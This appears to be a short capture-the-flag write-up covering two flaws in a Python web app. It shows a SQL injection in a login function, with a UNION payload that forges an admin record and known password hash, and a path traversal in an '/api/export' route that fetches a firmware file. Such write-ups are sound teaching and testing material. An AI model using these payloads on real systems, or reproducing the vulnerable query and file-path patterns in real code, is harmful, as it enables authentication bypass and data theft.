The utl.login function exposes a SQL injection.
```py
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```
This can be used to return an admin user with a known password.
```json
{
    "username": "A\" UNION SELECT \"admin\", \"7815696ecbf1c96e6894b779456d330e\" FROM users WHERE username = \"admin",
    "password": "asd"}
```

The `/api/export` route gives us a path traversal
```py
def exportFile():
    ...
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
```
```json
{
    "name":  "../../../signal_sleuth_firmware"
}
```
